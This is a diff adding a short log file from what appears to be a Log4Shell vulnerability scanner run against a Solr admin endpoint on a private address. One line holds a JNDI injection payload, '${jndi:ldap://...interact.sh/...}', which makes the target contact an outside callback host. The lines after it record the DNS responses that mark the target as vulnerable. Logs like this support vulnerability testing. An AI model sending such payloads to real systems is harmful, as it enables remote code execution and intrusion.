@@ -1,0 +1,12 @@
+2022/02/24T11:00:56 - INFO - Setting up dnslog DNS callback provider
+2022/02/24T11:00:56 - INFO - Setting up interactsh DNS callback provider.
+2022/02/24T11:00:56 - INFO - Executing the script with the following arguments: ['-u', 'http://192.168.123.117:8983/solr/admin/cores', '--headers-file', 'header-single.txt']
+2022/02/24T11:00:57 - INFO - Starting scan.
+2022/02/24T11:00:57 - INFO - URL: http://192.168.123.117:8983/solr/admin/cores - PAYLOAD: ${jndi:ldap://192.168.123.117.8fr34208k9l9412uc6722oj5t35t8404s.interact.sh/w1exbs6}.
+2022/02/24T11:00:57 - INFO - Scan completed. Waiting for DNS repsonse.
+2022/02/24T11:01:03 - CRITICAL - DNS return found. One or more targets vulnarable
+2022/02/24T11:01:03 - CRITICAL - {"timestamp": "2022-02-24T11:00:58.733195522Z", "host": "192.168.123.117.8fr34208k9l9412uc6722oj5t35t8404s.8fr34208k9l9412uc6722oj5t35t8404s.interact.sh", "remote_address": "172.253.11.204"}
+2022/02/24T11:01:03 - CRITICAL - {"timestamp": "2022-02-24T11:00:58.736871915Z", "host": "192.168.123.117.8fr34208k9l9412uc6722oj5t35t8404s.8fr34208k9l9412uc6722oj5t35t8404s.interact.sh", "remote_address": "172.253.11.201"}
+2022/02/24T11:01:03 - CRITICAL - {"timestamp": "2022-02-24T11:00:58.76351302Z", "host": "192.168.123.117.8fr34208k9l9412uc6722oj5t35t8404s.8fr34208k9l9412uc6722oj5t35t8404s.interact.sh", "remote_address": "173.194.169.10"}
+2022/02/24T11:01:03 - CRITICAL - {"timestamp": "2022-02-24T11:00:58.787805074Z", "host": "192.168.123.117.8fr34208k9l9412uc6722oj5t35t8404s.8fr34208k9l9412uc6722oj5t35t8404s.interact.sh", "remote_address": "74.125.114.207"}
+2022/02/24T11:01:03 - CRITICAL - {"timestamp": "2022-02-24T11:00:58.814203482Z", "host": "192.168.123.117.8fr34208k9l9412uc6722oj5t35t8404s.8fr34208k9l9412uc6722oj5t35t8404s.interact.sh", "remote_address": "172.217.40.8"}
